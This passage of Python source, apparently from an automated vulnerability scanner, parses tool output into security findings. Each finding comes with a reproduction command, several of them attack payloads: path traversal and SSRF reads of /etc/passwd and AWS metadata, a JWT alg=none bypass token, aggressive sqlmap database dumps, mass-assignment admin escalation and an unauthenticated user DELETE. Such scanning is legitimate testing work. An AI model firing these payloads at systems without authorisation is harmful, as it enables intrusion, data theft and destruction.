            findings.append({"type":"self_signed_cert","detail":line.strip(),"severity":"medium",
                              "path":":443","command":"openssl s_client -connect <target>:443"})
        if 'expired' in ll:
            findings.append({"type":"expired_cert","detail":line.strip(),"severity":"high",
                              "path":":443","command":"openssl s_client -connect <target>:443"})
    return findings

def parse_headers(output):
    findings = []
    for msg, sev in sig_matches(output):
        findings.append({"type":"header_anomaly","detail":msg,"severity":sev,
                          "path":"HTTP headers","command":"curl -sIL http://<target>"})
    # curl -sIL prints the header block of every hop; the LAST HTTP/ line is
    # the terminal response. Missing security headers are only a real finding
    # against a terminal 2xx/4xx/5xx — a redirect-only host (every hop a 3xx)
    # says nothing about the resource's final headers, so don't claim a
    # "missing CSP/HSTS" weakness off a bare 301.
    statuses = re.findall(r'HTTP/\S+\s+(\d{3})', output)
    if not statuses or not any(s not in REDIRECT_CODES for s in statuses):
        return findings
    missing = []
    if 'Content-Security-Policy' not in output: missing.append('CSP')
    if 'X-Frame-Options' not in output and 'frame-ancestors' not in output: missing.append('X-Frame-Options')
    if 'X-Content-Type-Options' not in output: missing.append('X-Content-Type-Options')
    if 'Strict-Transport-Security' not in output: missing.append('HSTS')
    if missing:
        findings.append({"type":"missing_headers","detail":f"Missing: {', '.join(missing)}",
                          "severity":"medium","path":"HTTP response headers",
                          "command":"curl -sI http://<target>"})
    return findings

def parse_smb(output):
    findings = []
    if re.search(r'Windows\s+[56789]\.0', output):
        findings.append({"type":"legacy_os","detail":"Legacy Windows OS — EternalBlue range",
                          "severity":"critical","path":"SMB :445",
                          "command":"nmap --script=smb-vuln-ms17-010 -p 445 <target>"})
    for line in output.splitlines():
        if re.search(r'Disk\s*\|', line, re.I) or re.search(r'IPC\$|ADMIN\$|C\$', line):
            findings.append({"type":"smb_share","detail":line.strip(),"severity":"medium",
                              "path":"SMB :445","command":"smbclient -L //<target> -N"})
    if ('NT_STATUS_ACCESS_DENIED' not in output and
            'session setup failed' not in output.lower() and 'Sharename' in output):
        findings.append({"type":"null_session","detail":"Null session authenticated",
                          "severity":"high","path":"SMB :445",
                          "command":"rpcclient -U '' -N <target> -c 'enumdomusers'"})
    return findings

def parse_snmp(output):
    findings = []
    if 'SNMPv2-MIB::sysDescr' in output:
        findings.append({"type":"snmp_public","detail":"SNMP 'public' community string accepted",
                          "severity":"high","path":"SNMP :161",
                          "command":"snmpwalk -v2c -c public <target>"})
    return findings

def parse_dirb(output):
    findings = []
    ansi_re = re.compile(r'\x1b\[[0-9;]*[mGKHF]')
    for line in output.splitlines():
        m = re.search(r'(https?://\S+)\s+\(CODE:(\d+)', line)
        if m:
            code, url = m.group(2), m.group(1)
            if code in REDIRECT_CODES or code not in ('200', '201', '204', '401', '403'):
                continue
            path = re.sub(r'https?://[^/]+', '', url)
            # Status-only content discovery is recon, never a vuln claim: a
            # catch-all router returns 200 for anything. Body verification is
            # the job of the dedicated .env/.git/etc probes.
            findings.append({"type": "web_path", "detail": f"HTTP {code} {url}",
                             "severity": "info", "path": path,
                             "command": f"curl -skL {url}"})
            continue
        # gobuster: index.html (Status: 200) [Size: 1234]
        g = re.search(r'(/?\S+)\s+\(Status:\s*(\d+)\)', line)
        if g:
            code, path = g.group(2), g.group(1).rstrip('/')
            if not path.startswith('/'):
                path = '/' + path
            if code in REDIRECT_CODES or code not in ('200', '201', '204', '401', '403'):
                continue
            findings.append({"type": "web_path", "detail": f"HTTP {code} http://<target>{path} (gobuster)",
                             "severity": "info", "path": path,
                             "command": f"curl -skL http://<target>{path}"})
            continue
        # ffuf (2.x writes path-only lines, ANSI-prefixed, with progress glued on \r):
        #   '\x1b[2K.bash_history   [Status: 200, Size: 41, Words: 3, ...]'
        # older builds print the full URL instead. Split per \r segment so a
        # progress line can never be mistaken for a result.
        for seg in re.split(r'\r', ansi_re.sub('', line)):
            f = re.match(r'\s*(https?://\S+?|\S+)\s+\[Status:\s*(\d+)[,\]]', seg)
            if not f:
                continue
            url, code = f.group(1), f.group(2)
            if code in REDIRECT_CODES or code not in ('200', '201', '204', '401', '403'):
                continue
            if url.startswith('http'):
                path = re.sub(r'https?://[^/]+', '', url)
            else:
                path = url if url.startswith('/') else '/' + url
            findings.append({"type": "web_path", "detail": f"HTTP {code} http://<target>{path} (ffuf)",
                             "severity": "info", "path": path,
                             "command": f"curl -skL http://<target>{path}"})
    return findings

def parse_banner_anomaly(output):
    findings = []
    for msg, sev in sig_matches(output):
        findings.append({"type":"banner_anomaly","detail":msg,"severity":sev,
                          "path":"service banner","command":"nmap --script=banner -p <ports> <target>"})
    for line in output.splitlines():
        port_m = re.match(r'(\d+)/tcp\s+open\s+\S+\s+(.*)', line)
        if port_m:
            port, info = port_m.group(1), port_m.group(2)
            if len(info) > 80:
                findings.append({"type":"verbose_banner","detail":f"Port {port} verbose banner: {info[:100]}",
                                  "severity":"low","path":f":{port}",
                                  "command":f"nmap --script=banner -p {port} <target>"})
    return findings

def parse_version_gap(output, sess):
    findings = []
    for line in output.splitlines():
        for svc_key, vdb in VERSION_DB.items():
            if svc_key in line.lower():
                ver_m = re.search(r'(\d+\.\d+[\.\d]*)', line)
                if ver_m:
                    found_ver = ver_m.group(1)
                    try:
                        fv = [int(x) for x in found_ver.split('.')[:2]]
                        ev = [int(x) for x in vdb['eol'].split('.')[:2]]
                        lv = [int(x) for x in vdb['latest'].split('.')[:2]]
                        gap = (lv[0]*100+lv[1]) - (fv[0]*100+fv[1])
                        port_m = re.search(r'(\d+)/tcp', line)
                        path = f":{port_m.group(1)}" if port_m else "service"
                        if fv <= ev:
                            findings.append({"type":"version_eol","severity":"critical","path":path,
                                "detail":f"{svc_key} {found_ver} is EOL (latest {vdb['latest']}) — {vdb['cve_prefix']}* exposure",
                                "command":f"nmap -sV -p {path.lstrip(':')} <target>"})
                        elif gap >= 4:
                            findings.append({"type":"version_outdated","severity":"high","path":path,
                                "detail":f"{svc_key} {found_ver} is {gap} versions behind (latest {vdb['latest']})",
                                "command":f"nmap -sV -p {path.lstrip(':')} <target>"})
                    except (ValueError, IndexError):
                        pass
    return findings

def parse_http_anomaly(output):
    findings = []
    if re.search(r'root:.*:/bin/', output):
        findings.append({"type":"path_traversal","severity":"critical","path":"/../../../../etc/passwd",
            "detail":"Path traversal returned /etc/passwd content — LFI confirmed",
            "command":"curl -sk 'http://<target>/../../../../etc/passwd'"})
    if re.search(r'HTTP/\S+ 200', output) and 'TRACE' in output:
        findings.append({"type":"trace_method","detail":"HTTP TRACE enabled — XST risk","severity":"medium",
            "path":"/","command":"curl -skI -X TRACE 'http://<target>/'"})
    if 'evil.com' in output and re.search(r'(Location|Host).*evil\.com', output):
        findings.append({"type":"host_header_injection","severity":"high","path":"Host header",
            "detail":"Host header value reflected in redirect — SSRF/cache poisoning",
            "command":"curl -skI -H 'Host: evil.com' 'http://<target>/'"})
    # .git / .env / admin — status alone proves nothing (catch-all routers 200
    # anything); findings require the probe body to actually BE the artifact.
    m = re.search(r'body:\.git\[(\d+)\] (.*)', output)
    if m and m.group(1) not in REDIRECT_CODES and m.group(1) in ('200', '201', '204') and \
       re.search(r'\[(core|remote|branch|user)\]|repositoryformatversion|refs/heads|packed-refs', m.group(2), re.I):
        findings.append({"type":"git_exposed","severity":"critical","path":"/.git/config",
            "detail":".git/config exposed — source/configuration disclosure",
            "command":"curl -skL 'http://<target>/.git/config'"})
    m = re.search(r'body:\.env\[(\d+)\] (.*)', output)
    if m and m.group(1) not in REDIRECT_CODES and m.group(1) in ('200', '201', '204') and \
       re.search(r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}', m.group(2)):
        findings.append({"type":"env_exposed","severity":"critical","path":"/.env",
            "detail":".env file exposed — credentials, API keys at risk",
            "command":"curl -skL 'http://<target>/.env'"})
    m = re.search(r'body:admin\[(\d+)\] (.*)', output)
    if m and m.group(1) not in REDIRECT_CODES and m.group(1) in ('200', '201', '204'):
        findings.append({"type":"admin_panel","severity":"info","path":"/admin",
            "detail":"Admin interface reachable (HTTP 200) — access control must be verified separately",
            "command":"curl -skL 'http://<target>/admin'"})
    return findings

def parse_timing(output):
    findings = []
    times = re.findall(r't=([\d.]+)', output)
    if len(times) >= 3:
        vals = [float(t) for t in times]
        avg, mx = sum(vals)/len(vals), max(vals)
        if mx > avg * 2.5:
            findings.append({"type":"timing_anomaly","severity":"medium","path":"/?id=",
                "detail":f"Response time variance avg={avg:.2f}s max={mx:.2f}s — possible blind injection",
                "command":"curl -sk -o /dev/null -w '%{time_total}' 'http://<target>/?id=1+AND+SLEEP(3)'"})
    valid = re.search(r'valid_user=([\d.]+)', output)
    invalid = re.search(r'invalid_user=([\d.]+)', output)
    if valid and invalid:
        vt, it = float(valid.group(1)), float(invalid.group(1))
        if abs(vt-it) > 0.3:
            findings.append({"type":"auth_timing_oracle","severity":"high","path":"/login",
                "detail":f"Login timing differs valid={vt:.3f}s vs invalid={it:.3f}s — username enumeration",
                "command":"curl -sk -X POST 'http://<target>/login' -d 'user=admin&pass=wrong'"})
    sqli = re.search(r'sqli_probe=([\d.]+)', output)
    baseline = re.search(r'sqli_baseline=([\d.]+)', output)
    if sqli and baseline:
        sp, bp = float(sqli.group(1)), float(baseline.group(1))
        if sp > bp + 2.5:
            findings.append({"type":"blind_sqli","severity":"critical","path":"/?id=",
                "detail":f"SLEEP-based SQLi: probe={sp:.2f}s vs baseline={bp:.2f}s — blind SQL injection confirmed",
                "command":"sqlmap -u 'http://<target>/?id=1' --level=5 --risk=3 --dbs"})
    return findings

def parse_auth_probe(output):
    findings = []
    # Unauthenticated baseline: a homepage that returns 200 to everyone (e.g.
    # catch-all) means a "200 with admin:admin" is NOT proof the credential was
    # accepted — only report default HTTP creds when auth is actually enforced.
    anon = re.search(r'anon=(\d{3})', output)
    anon_code = anon.group(1) if anon else None
    enforced = bool(anon_code) and anon_code not in REDIRECT_CODES and anon_code not in ('000', '200', '201', '204')
    if enforced:
        for cred in ['admin:admin=200', 'admin:password=200', 'root:root=200']:
            if cred in output:
                pair = cred.replace('=200', '')
                findings.append({"type": "default_cred_http", "severity": "critical",
                    "path": "/ (HTTP Basic Auth)",
                    "detail": f"HTTP Basic Auth accepted default credential: {pair}",
                    "command": f"curl -sku {pair} http://<target>/"})
    if re.search(r'ftp.*230|230.*logged', output, re.I):
        findings.append({"type":"ftp_anon","severity":"high","path":"FTP :21",
            "detail":"FTP anonymous login accepted",
            "command":"ftp <target>  # user: anonymous"})
    ssh_ver = re.search(r'SSH-[\d.]+-(\S+)', output)
    if ssh_ver:
        if re.search(r'SSH-1\.|SSH-2\.0-OpenSSH_[1-6]\.', output):
            findings.append({"type":"ssh_outdated","severity":"high","path":"SSH :22",
                "detail":f"Outdated SSH: {ssh_ver.group(0)}",
                "command":"nc -w 4 <target> 22"})
    missing_flags = []
    if 'httponly' not in output.lower(): missing_flags.append('HttpOnly')
    if 'secure' not in output.lower(): missing_flags.append('Secure')
    if 'samesite' not in output.lower(): missing_flags.append('SameSite')
    if missing_flags and 'set-cookie' in output.lower():
        findings.append({"type":"cookie_flags","severity":"medium","path":"/login (Set-Cookie header)",
            "detail":f"Session cookie missing: {', '.join(missing_flags)}",
            "command":"curl -skI 'http://<target>/login'"})
    return findings

def parse_nse_deep(output):
    findings = []
    checks = [
        (r'recursion:\s*Recursion appears to be enabled', "DNS recursion enabled — amplification DDoS risk", "high", "DNS :53", "nmap --script=dns-recursion -p 53 <target>"),
        (r'ntp-monlist', "NTP monlist enabled — DDoS amplification", "high", "NTP :123", "nmap --script=ntp-monlist -p 123 <target>"),
        (r'smtp.*open relay|relay.*accepted', "SMTP open relay confirmed", "critical", "SMTP :25", "nmap --script=smtp-open-relay -p 25 <target>"),
        (r'ldap.*rootDSE|namingContexts', "LDAP anonymous bind", "medium", "LDAP :389", "nmap --script=ldap-rootdse -p 389 <target>"),
        (r'ftp-anon.*Login with password', "FTP anonymous read/write", "high", "FTP :21", "nmap --script=ftp-anon -p 21 <target>"),
        # redis_version must be a REAL version string — "Redis server not
        # running" must never become "Redis accessible without auth".
        (r'redis_version\s*[:=]\s*\d', "Redis accessible without auth", "critical", "Redis :6379", "redis-cli -h <target> ping"),
        # Positive MongoDB data evidence only — "db with 0 databases" (closed
        # port) is NOT an access finding.
        (r'totalSize|\bb*db\b.*with [1-9]|databases:\s*[1-9]|total\s+size\s*[1-9]', "MongoDB accessible without auth", "critical", "MongoDB :27017", "nmap --script=mongodb-info -p 27017 <target>"),
    ]
    for pattern, msg, sev, path, cmd in checks:
        if re.search(pattern, output, re.I):
            findings.append({"type":"protocol_vuln","detail":msg,"severity":sev,
                "path":path,"command":cmd})
    return findings

def parse_hydra(output):
    findings = []
    for line in output.splitlines():
        if 'login:' in line and 'password:' in line:
            findings.append({"type":"default_cred","detail":line.strip(),"severity":"critical",
                "path":"SSH :22","command":"hydra -l <user> -p <pass> ssh://<target>"})
    return findings

def parse_msf(output):
    findings = []
    for line in output.splitlines():
        if _NEGATED_RESULT.search(line):
            continue
        if 'vulnerable' in line.lower() or re.search(r'CVE-\d{4}-\d+', line):
            findings.append({"type":"msf_finding","detail":line.strip(),"severity":"high",
                "path":"service","command":"msfconsole -q"})
    return findings

def parse_generic(output):
    findings = []
    keywords = ['error','warning','open','found','vuln','allow','enabled','accessible',
                'weak','default','anonymous','expired','misconfig','exposed','no auth',
                'unauthenticated','world-readable','writable']
    for line in output.splitlines():
        stripped = line.strip()
        ll = stripped.lower()
        if not stripped or len(stripped) < 20:
            continue
        if stripped.startswith(';;'):
            continue
        if '\x1b[' in stripped:
            continue
        if re.match(r'^(error|warn|info|fatal|debug)\s*:', ll):
            continue
        if re.match(r'^\w[\w\- ]*:', stripped):
            continue
        if re.match(r'^(?:\[\*\]\s*)?no\s+[\w\s-]{0,40}found\.?\s*$', stripped, re.I):
            continue
        if any(k in ll for k in keywords):
            findings.append({"type":"generic","detail":stripped,"severity":"info",
                "path":"various","command":"manual review"})
    return findings


def parse_waf(output):
    """Report ONLY real WAF/CDN detections — never banner art, errors or tool noise."""
    findings = []
    detection = re.compile(
        r'is behind|behind the|in front of the site|waf[ -]?detected|'
        r'identified.*waf|wafw00f.*found|the site .* is behind', re.I)
    vendor = re.compile(
        r'\b(cloudflare|mod[\s_-]?security|imperva|akamai|barracuda|f5[\s-]?big[\s-]?ip|'
        r'fortiweb|aws[\s-]?waf|fastly|incapsula|sucuri|wordfence|citrix[\s-]?netscaler|'
        r'dosarrest|stackpath|sitelock|qrator)\b', re.I)
    for line in output.splitlines():
        s = line.strip()
        if not s or len(s) < 12:
            continue
        if detection.search(s):
            findings.append({"type":"waf_detected","detail":s[:160],"severity":"info",
                "path":"HTTP WAF/CDN","command":"wafw00f / nmap --script=http-waf-detect"})
        elif vendor.search(s) and re.search(r'waf|firewall|shield|protect|cdn', s, re.I):
            findings.append({"type":"waf_detected","detail":s[:160],"severity":"info",
                "path":"HTTP WAF/CDN","command":"wafw00f / nmap --script=http-waf-detect"})
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# NEW PARSERS — API & DATABASE
# ─────────────────────────────────────────────────────────────────────────────
def _api_evidence(path, code, body):
    """Body-evidence gate for discovery probes: a code alone proves nothing
    (catch-all routers 200 anything). Sensitive/spec paths only become
    findings when the returned content is actually the artifact they name."""
    if code in REDIRECT_CODES:
        return False
    if any(k in path for k in ('openapi', 'swagger', 'api-docs', 'api_docs')):
        return bool(body) and any(m in body for m in (
            '"openapi"', '"swagger"', '"paths"', '"components"',
            '"definitions"', '"info"', 'swagger-ui'))
    if 'actuator/env' in path:
        return bool(body) and any(m in body for m in (
            '"propertySources"', '"activeProfiles"', '"systemEnvironment"', '"env"'))
    if '/actuator' in path:
        return bool(body) and any(m in body for m in (
            '"status"', '"beans"', '"mappings"', '"configprops"', '"heapdump"',
            '"caches"', '"loggers"', '"metrics"', '"threaddump"'))
    if path == '/graphql':
        return bool(body) and any(m in body for m in (
            '"queryType"', '"__schema"', '"types"', '"data"', 'graphql'))
    if path == '/metrics':
        return bool(body) and any(m in body for m in (
            'jvm_', 'process_', 'http_server_', 'prometheus', '_samples'))
    if path == '/health':
        return bool(body) and '"status"' in body
    return True


def parse_api_discovery(output):
    findings = []
    sensitive = {'/swagger':'/swagger — API docs exposed (schema disclosure)','swagger.json':'swagger.json — full API schema accessible',
                 '/openapi':'/openapi — OpenAPI spec exposed','/api-docs':'/api-docs exposed',
                 '/actuator':'/actuator — Spring Boot actuator exposed (env, mappings, beans)',
                 '/actuator/env':'/actuator/env — environment variables exposed',
                 '/graphql':'/graphql endpoint found','/metrics':'/metrics — internal metrics exposed',
                 '/health':'/health endpoint (may disclose internal state)'}
    sensitive_keys = sorted(sensitive, key=len, reverse=True)
    for line in output.splitlines():
        m = re.match(r'(/[^\s|]+):(\d{3})\|(.*)', line)
        if not m:
            continue
        path, code, body = m.group(1), m.group(2), m.group(3)
        if code in REDIRECT_CODES:                      # 3xx proves nothing
            continue
        if code not in ('200', '201', '204', '401', '403', '405', '500'):
            continue
        if not _api_evidence(path, code, body):
            continue
        if 'actuator/env' in path and code in ('200', '201', '204'):
            sev = 'critical'
        elif any(s in path for s in ('swagger', 'openapi', 'api-docs', 'graphql')):
            sev = 'high'
        elif '/actuator' in path:
            sev = 'medium'
        else:
            sev = 'info'                                # mapping recon, not a vuln
        desc = next((sensitive[k] for k in sensitive_keys if path.startswith(k)),
                    (f"API endpoint {path} requires authentication (HTTP {code})" if code in ('401', '403') else
                     f"API endpoint {path} responds (HTTP {code})"))
        findings.append({"type": "api_endpoint", "detail": desc, "severity": sev,
                         "path": path, "command": f"curl -skL http://<target>{path}"})
    if '__schema' in output and 'types' in output:
        findings.append({"type": "graphql_introspection", "severity": "high",
            "detail": "GraphQL introspection enabled — full schema disclosed",
            "path": "/graphql",
            "command": "curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'  http://<target>/graphql"})
    return findings

def parse_api_bola(output):
    findings = []
    lines = output.splitlines()
    for i, line in enumerate(lines):
        if '=== id=' in line:
            id_m = re.search(r'id=(\S+)', line)
            if not id_m:
                continue
            obj_id = id_m.group(1)
            block = '\n'.join(lines[i:i+10])
            # IDOR evidence: the queried object id is echoed back, or the
            # response carries a concrete user identity (email/username) — a
            # bare JSON wrapper or catch-all page is not data disclosure.
            id_echo = re.escape(obj_id)
            if (re.search(r'"id"\s*:\s*["\']?' + id_echo + r'["\']?(?:\s*[,}])', block, re.I) or
                    re.search(r'"email"\s*:\s*"[^"]*@[^"]+"', block, re.I) or
                    re.search(r'"username"\s*:\s*"[^"]{2,}"|"name"\s*:\s*"[^"]{2,}"', block, re.I)):
                findings.append({"type": "bola_idor", "severity": "critical",
                    "detail": f"BOLA/IDOR: unauthenticated data returned for id={obj_id} — object-level auth missing",
                    "path": f"/api/v1/users/{obj_id}",
                    "command": f"curl -sk 'http://<target>/api/v1/users/{obj_id}'"})
            if re.search(r'"(password|secret|token|ssn|credit|card|hash|api_key|access_key)"\s*:\s*"?[^"]{3,}"?', block, re.I):
                findings.append({"type": "sensitive_data_exposure", "severity": "critical",
                    "detail": f"Sensitive fields exposed via IDOR (id={obj_id})",
                    "path": f"/api/v1/users/{obj_id}",
                    "command": f"curl -sk 'http://<target>/api/v1/users/{obj_id}'"})
    return findings

def parse_api_auth(output):
    findings = []
    checks = [
        ('jwt_none: 200', "JWT algorithm=none accepted — auth bypass", "critical", "/api/v1/admin",
         "curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' http://<target>/api/v1/admin"),
        ('null_token: 200', "Null Bearer token accepted — auth bypass", "critical", "/api/v1/users",
         "curl -H 'Authorization: Bearer null' http://<target>/api/v1/users"),
    ]
    # Baseline: the unauthenticated admin call. If it already returns 200 there
    # is no auth to bypass — a "JWT none bypass" claim would be a hallucination.
    anon = re.search(r'anon:(\d{3})\|', output)
    anon_code = anon.group(1) if anon else None
    if anon_code and anon_code not in REDIRECT_CODES and anon_code != '000':
        if anon_code in ('200', '201', '204'):
            findings.append({"type": "unauth_endpoint", "severity": "high",
                "detail": "No authentication enforced — /api/v1/admin returns HTTP 200 without credentials",
                "path": "/api/v1/admin",
                "command": "curl -sk http://<target>/api/v1/admin"})
        else:
            for marker, msg, sev, path, cmd in checks:
                if marker in output:
                    findings.append({"type": "broken_auth", "detail": msg, "severity": sev,
                        "path": path, "command": cmd})
            for line in output.splitlines():
                m = re.match(r'(users|config):\s*(200)', line)
                if m:
                    findings.append({"type": "unauth_endpoint", "severity": "high",
                        "detail": f"API endpoint accessible without auth: {m.group(1)} → HTTP 200",
                        "path": f"/api/v1/{m.group(1)}",
                        "command": f"curl -sk http://<target>/api/v1/{m.group(1)}"})
    return findings

def parse_api_injection(output):
    findings = []
    error_patterns = [
        (r"SQL syntax|mysql_fetch|ORA-\d+|PSQLException|SQLiteException|you have an error in your sql",
         "SQL error in API response — SQL injection confirmed", "critical", "sqli"),
        (r"Warning.*mysql|Warning.*pg_|Fatal error.*mysqli",
         "PHP DB warning in API — SQL injection / verbose errors", "critical", "sqli"),
        (r"\{.*\$gt|operator.*\$ne|\$regex.*matched",
         "NoSQL operator reflected in response — NoSQL injection", "critical", "nosqli"),
        (r"SSTI_RESULT:[^\n]*\b49\b|\{\{7\*7\}\}.*\b49\b",
         "SSTI confirmed: 7*7=49 in response — Server-Side Template Injection", "critical", "ssti"),
        (r"Traceback|stack trace|at.*\(.*\)\s*$|Exception in thread",
         "Stack trace / exception in API response — code disclosure", "high", "error_disclosure"),
    ]
    lines_text = output
    for pattern, msg, sev, ftype in error_patterns:
        if re.search(pattern, lines_text, re.I):
            findings.append({"type":ftype,"detail":msg,"severity":sev,
                "path":"/api/v1 endpoint","command":"sqlmap -u 'http://<target>/api/v1/users?id=1' --level=5"})
    return findings

def parse_api_ssrf(output):
    findings = []
    imds_markers = re.compile(r'ami-id|instance-id|security-credentials|latest/meta-data|dynamic|local-ipv4|mac\b', re.I)
    for line in output.splitlines():
        m = re.match(r'(\w+)=baseline:(\d+)\|imds:(\d+)\|(.*?)\|local22:(\d+)$', line)
        if not m:
            continue
        param, base, imds, ibody, local = m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
        # IMDS SSRF: an HTTP 200 alone can be a catch-all; the response must
        # actually contain AWS IMDS metadata for a firm finding. 3xx proves
        # nothing.
        if imds not in REDIRECT_CODES and imds in ('200', '201', '202', '204') and \
           imds != base and imds_markers.search(ibody):
            findings.append({"type": "ssrf", "severity": "critical",
                "detail": f"SSRF via '{param}' parameter — AWS IMDS metadata returned (HTTP {imds})",
                "path": f"/api/v1/fetch?{param}=http://169.254.169.254/",
                "command": f"curl -skL 'http://<target>/api/v1/fetch?{param}=http://169.254.169.254/latest/meta-data/'"})
        # localhost:22 SSRF: the probe must CHANGE the response relative to the
        # inert baseline (catch-all apps return the same code for any param).
        if local not in REDIRECT_CODES and local not in ('000', '') and local != base:
            findings.append({"type": "ssrf", "severity": "high",
                "detail": f"SSRF via '{param}' — internal network probe altered the response ({base} → {local})",
                "path": f"/api/v1/proxy?{param}=http://127.0.0.1:22",
                "command": f"curl -skL 'http://<target>/api/v1/proxy?{param}=http://127.0.0.1:22'"})
    if re.search(r'root:.*:/bin/', output):
        findings.append({"type":"ssrf_lfi","severity":"critical",
            "detail":"SSRF + file:// scheme confirmed — /etc/passwd retrieved",
            "path":"/api/v1/fetch?url=file:///etc/passwd",
            "command":"curl -sk 'http://<target>/api/v1/fetch?url=file:///etc/passwd'"})
    return findings

def parse_api_mass_assign(output):
    findings = []
    # Mass assignment requires the response to be a stored resource (an id in
    # the same output) carrying the elevated field — request-body echo alone is
    # not proof the field was accepted.
    entity_id = re.search(r'"?\s*"id"\s*:\s*', output)
    if entity_id and re.search(r'"role"\s*:\s*"admin"|"is_admin"\s*:\s*true|"admin"\s*:\s*true|"privilege"\s*:\s*"admin"', output, re.I):
        findings.append({"type":"mass_assignment","severity":"critical",
            "detail":"Mass assignment: admin role field accepted in API body",
            "path":"/api/v1/users/1 (PUT/PATCH body)",
            "command":"curl -X PUT -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' http://<target>/api/v1/users/1"})
    if entity_id and re.search(r'"credits"\s*:\s*\d{4,}|"balance"\s*:\s*\d{4,}', output, re.I):
        findings.append({"type":"mass_assignment","severity":"high",
            "detail":"Mass assignment: numeric privilege field accepted (credits/balance manipulation)",
            "path":"/api/v1/profile (PATCH body)",
            "command":"curl -X PATCH -H 'Content-Type: application/json' -d '{\"credits\":99999}' http://<target>/api/v1/profile"})
    # Function-level access: an arbitrary bare 200 is not proof — the
    # unauthenticated admin endpoint must return real JSON data (>=2 members,
    # which catch-all HTML / single-key error wrappers don't).
    def _json_data(body):
        return body and len(re.findall(r'"[A-Za-z_][A-Za-z0-9_]{1,}"\s*:', body)) >= 2
    unauth_proven = False
    for line in output.splitlines():
        m = re.match(r'(admin/users|internal/debug):(\d{3})\|(.*)', line)
        if m and m.group(2) not in REDIRECT_CODES and m.group(2) in ('200', '201', '202', '204') and _json_data(m.group(3)):
            unauth_proven = True
            findings.append({"type":"broken_function_auth","severity":"critical",
                "detail":f"Admin endpoint accessible without auth: /{m.group(1)} → HTTP {m.group(2)} (JSON data returned)",
                "path":f"/api/v1/{m.group(1)}",
                "command":f"curl -skL http://<target>/api/v1/{m.group(1)}"})
    # DELETE corroboration only counts once unauth access was already proven.
    delete_m = re.search(r'DELETE user:(\d{3})\|', output)
    if delete_m and unauth_proven and delete_m.group(1) in ('200', '204'):
        findings.append({"type":"broken_function_auth","severity":"critical",
            "detail":f"Broken Function Level Auth: DELETE /api/v1/users/1 returned HTTP {delete_m.group(1)} without authentication",
            "path":"/api/v1/users/1 (DELETE)",
            "command":"curl -X DELETE http://<target>/api/v1/users/1"})
    return findings

def parse_api_misc(output):
    findings = []
    if re.search(r'access-control-allow-origin:\s*\*', output, re.I):
        findings.append({"type":"api_cors_wildcard","severity":"high",
            "detail":"API CORS wildcard — any origin can read API responses",
            "path":"/api/v1 (CORS headers)",
            "command":"curl -H 'Origin: https://evil.com' -I http://<target>/api/v1/users"})
    responses = [r for r in re.findall(r'\b(\d{3})\b', output[:500]) if r != '000' and r not in REDIRECT_CODES]
    total = len(responses)
    non_429 = [r for r in responses if r != '429']
    if total >= 10 and len(non_429) == total:
        findings.append({"type":"missing_rate_limit","severity":"medium",
            "detail":f"No rate limiting detected — {total} requests returned without any 429/throttle",
            "path":"/api/v1/login (rate limit test)",
            "command":"for i in $(seq 1 50); do curl -s -o /dev/null -w '%{http_code}' http://<target>/api/v1/login; done"})
    if re.search(r'api_key|secret_key|aws_secret|stripe_key|twilio|sendgrid', output, re.I):
        findings.append({"type":"api_key_exposure","severity":"critical",
            "detail":"API key or secret token visible in /api/v1/config response",
            "path":"/api/v1/config",
            "command":"curl -sk http://<target>/api/v1/config | grep -iE 'key|secret|token'"})
    if re.search(r'(stack trace|traceback|exception|syntax error|ORA-|SQLSTATE)', output, re.I):
        findings.append({"type":"verbose_error","severity":"medium",
            "detail":"Verbose error messages in API response — internal stack trace disclosed",
            "path":"/api/v1 (error endpoint)",
            "command":"curl -sk -X POST -H 'Content-Type: application/json' -d '{\"bad\":' http://<target>/api/v1/users"})
    return findings

def parse_db_discovery(output):
    findings = []
    db_ports = {
        '1433': ('mssql','MSSQL','high'),
        '1521': ('oracle','Oracle DB','high'),
        '3306': ('mysql','MySQL','medium'),
        '5432': ('postgres','PostgreSQL','medium'),
        '5984': ('couchdb','CouchDB','medium'),
        '6379': ('redis','Redis','high'),
        '7474': ('neo4j','Neo4j','medium'),
        '9200': ('elasticsearch','Elasticsearch','high'),
        '27017': ('mongodb','MongoDB','high'),
        '11211': ('memcached','Memcached','high'),
        '9042': ('cassandra','Cassandra','medium'),
    }
    for line in output.splitlines():
        m = re.match(r'(\d+)/tcp\s+open', line)
        if m:
            port = m.group(1)
            if port in db_ports:
                db_id, db_name, sev = db_ports[port]
                findings.append({"type":"db_exposed","detail":f"{db_name} port {port} open — database directly accessible",
                    "severity":sev,"path":f":{port}",
                    "command":f"nmap -sV -p {port} <target>"})
    return findings

def parse_db_unauth(output):
    findings = []
    if re.search(r'PONG|redis_version', output, re.I):
        findings.append({"type":"db_unauth_access","severity":"critical",
            "detail":"Redis accessible without authentication — full read/write/config access",
            "path":"Redis :6379",
            "command":"redis-cli -h <target> ping; redis-cli -h <target> KEYS '*'"})
    if re.search(r'mongodb-databases|totalSize|databases\s*=\s*\[|admin\s*\.\s*local', output, re.I):
        findings.append({"type":"db_unauth_access","severity":"critical",
            "detail":"MongoDB accessible without authentication — all databases enumerable",
            "path":"MongoDB :27017",
            "command":"mongo <target>:27017 --eval 'db.adminCommand({listDatabases:1})'"})
    if re.search(r'health.*green|indices.*pri|index.*docs', output, re.I):
        findings.append({"type":"db_unauth_access","severity":"critical",
            "detail":"Elasticsearch accessible without auth — all indices readable",
            "path":"Elasticsearch :9200",
            "command":"curl http://<target>:9200/_cat/indices?v"})
    if re.search(r'\["_all_dbs"\]|\["[a-z_]+"\]', output):
        findings.append({"type":"db_unauth_access","severity":"high",
            "detail":"CouchDB accessible without auth — database list exposed",
            "path":"CouchDB :5984",
            "command":"curl http://<target>:5984/_all_dbs"})
    if re.search(r'results.*series|databases.*name', output, re.I):
        findings.append({"type":"db_unauth_access","severity":"high",
            "detail":"InfluxDB accessible without auth — SHOW DATABASES returned data",
            "path":"InfluxDB :8086",
            "command":"curl 'http://<target>:8086/query?q=SHOW+DATABASES'"})
    return findings

def parse_db_default_creds(output):
    findings = []
    if re.search(r'mysql.*Empty password|root.*empty', output, re.I):
        findings.append({"type":"db_default_cred","severity":"critical",
            "detail":"MySQL root account has empty password",
